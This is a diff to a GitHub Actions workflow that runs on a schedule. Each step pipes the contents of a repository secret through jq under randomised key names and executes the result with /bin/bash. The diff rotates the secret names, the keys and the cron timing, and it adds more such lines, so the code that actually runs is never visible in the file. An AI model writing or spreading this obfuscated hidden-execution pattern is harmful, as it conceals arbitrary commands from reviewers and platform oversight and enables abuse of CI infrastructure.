@@ -2,23 +2,26 @@ name: tianyuanwangjian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
+    - cron: '54 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianyuanwangjian
         env:
-          gwue9821: ${{ secrets.gwue9821 }}
+          du5: ${{ secrets.du5 }}
         run: |
-          echo $gwue9821 | jq -r .gwgxk359 | /bin/bash
-          echo $c055 | jq -r .vp0 | /bin/bash
-          echo $r65 | jq -r .g7393 | /bin/bash
-          echo $fyyv1068 | jq -r .da589 | /bin/bash
-          echo $d4326 | jq -r .f729 | /bin/bash
-          echo $gsjc67 | jq -r .epxdz2 | /bin/bash
-          echo $ad378 | jq -r .edc7 | /bin/bash
-          echo $np77897 | jq -r .p13848 | /bin/bash
+          echo $du5 | jq -r .k546 | /bin/bash
+          echo $xcl96661 | jq -r .tfqte2388 | /bin/bash
+          echo $yiqvv6875 | jq -r .zzux0966 | /bin/bash
+          echo $k519 | jq -r .czvfx59680 | /bin/bash
+          echo $t017 | jq -r .umuwt8220 | /bin/bash
+          echo $xhcij98818 | jq -r .ogsce38 | /bin/bash
+          echo $wv15261 | jq -r .ow7368 | /bin/bash
+          echo $qdyye00002 | jq -r .ngnax20 | /bin/bash
+          echo $nlvh31 | jq -r .jb8 | /bin/bash
+          echo $zyt40 | jq -r .ch69310 | /bin/bash
+          echo $nz80372 | jq -r .ki0178 | /bin/bash
+          echo $xga285 | jq -r .k86683 | /bin/bash
 
